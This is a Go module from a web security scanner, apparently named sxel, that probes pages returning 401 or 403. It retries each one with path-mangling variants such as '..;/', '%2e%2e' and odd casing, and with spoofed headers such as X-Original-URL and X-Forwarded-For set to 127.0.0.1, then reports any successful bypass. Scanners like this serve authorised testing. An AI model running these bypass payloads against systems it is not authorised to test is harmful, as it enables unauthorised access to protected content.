package modules

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
)

func isForbiddenStatus(code int) bool {
	return code == 401 || code == 403
}

type bypassHeader struct {
	key string
	val func(path string) string
}

var bypassHeaderTricks = []bypassHeader{
	{"X-Original-URL", func(p string) string { return p }},
	{"X-Rewrite-URL", func(p string) string { return p }},
	{"X-Forwarded-Host", func(p string) string { return "localhost" }},
	{"X-Host", func(p string) string { return "localhost" }},
	{"X-Forwarded-Server", func(p string) string { return "localhost" }},
	{"X-Custom-IP-Authorization", func(p string) string { return "127.0.0.1" }},
	{"X-Forwarded-For", func(p string) string { return "127.0.0.1" }},
	{"X-Real-IP", func(p string) string { return "127.0.0.1" }},
	{"X-Originating-IP", func(p string) string { return "127.0.0.1" }},
	{"Forwarded", func(p string) string { return "for=127.0.0.1;host=localhost" }},
}

func bypassPathVariants(path string) []string {
	p := strings.Trim(path, "/")
	if p == "" {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	add := func(s string) {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	variants := []string{
		"/" + p,
		"/" + p + "/",
		"//" + p,
		"./" + p,
		"..;/" + p,
		"/" + p + "/.",
		"/" + p + ";",
		"/" + p + ";/",
		"/" + p + "%2f",
		"/" + p + "%2F",
		"/%2e%2e/" + p,
		"/%2e/%2e/" + p,
		"/%252e%252e/" + p,
		"/" + p + "/%2e",
		"/" + p + "..;/",
		"/" + p + "/..;/",
	}
	for _, v := range variants {
		add(v)
	}
	add(strings.ToLower("/" + p))
	add(strings.ToUpper("/" + p))
	if len(p) > 0 && p[0] >= 'a' && p[0] <= 'z' {
		add("/" + strings.ToUpper(p[:1]) + p[1:])
	}
	return out
}

func Scan403Bypass(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult
	u, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}
	if u.Host == "" {
		return nil
	}
	baseBody, baseStatus, err := core.DoGET(client, cfg, target.URL)
	if err != nil || !isForbiddenStatus(baseStatus) {
		return nil
	}
	origin := u.Scheme + "://" + u.Host
	nfURL := origin + "/sxel-nf-" + randomHex(6)
	nfBody, _, _ := core.DoGET(client, cfg, nfURL)

	fetch := func(rawURL string, hdr map[string]string) (int, string) {
		req, err := http.NewRequest("GET", rawURL, nil)
		if err != nil {
			return 0, ""
		}
		core.ApplyHeaders(req, cfg)
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return 0, ""
		}
		defer resp.Body.Close()
		if resp.Request.URL.String() != rawURL {
			return 0, ""
		}
		return resp.StatusCode, core.ReadBody(resp.Body)
	}

	valid := func(code int, body string) bool {
		if code < 200 || code > 299 {
			return false
		}
		if len(body) == 0 || body == baseBody {
			return false
		}
		if nfBody != "" && body == nfBody {
			return false
		}
		return true
	}

	report := func(desc, payload, evidence string) {
		results = append(results, core.ScanResult{
			Type: "Forbidden Bypass", URL: target.URL, Method: "GET",
			Parameter: desc, Payload: payload,
			Severity: "MEDIUM", Evidence: evidence, Timestamp: time.Now(),
		})
		output.Warn("403 Bypass: %s %s (%s)", target.URL, desc, payload)
	}

	path := u.Path
	if path == "" {
		path = "/"
	}
	baseEvidence := fmt.Sprintf("%d -> ", baseStatus)
	for _, p := range bypassPathVariants(path) {
		tu := origin + p
		if u.RawQuery != "" {
			tu += "?" + u.RawQuery
		}
		code, body := fetch(tu, nil)
		if valid(code, body) {
			report("path", p, baseEvidence+fmt.Sprintf("%d (%d bytes)", code, len(body)))
			if len(results) >= 5 {
				return results
			}
		}
	}
	for _, h := range bypassHeaderTricks {
		code, body := fetch(target.URL, map[string]string{h.key: h.val(path)})
		if valid(code, body) {
			report("header", h.key+": "+h.val(path), baseEvidence+fmt.Sprintf("%d (%d bytes)", code, len(body)))
			if len(results) >= 5 {
				return results
			}
		}
	}
	for _, h := range bypassHeaderTricks {
		if !strings.HasPrefix(h.key, "X-Original") && !strings.HasPrefix(h.key, "X-Rewrite") {
			continue
		}
		rootURL := origin + "/"
		if u.RawQuery != "" {
			rootURL += "?" + u.RawQuery
		}
		code, body := fetch(rootURL, map[string]string{h.key: h.val(path)})
		if valid(code, body) {
			report("header-on-root", h.key+": "+h.val(path)+" @ /", baseEvidence+fmt.Sprintf("%d (%d bytes)", code, len(body)))
			if len(results) >= 5 {
				return results
			}
		}
	}
	return results
}
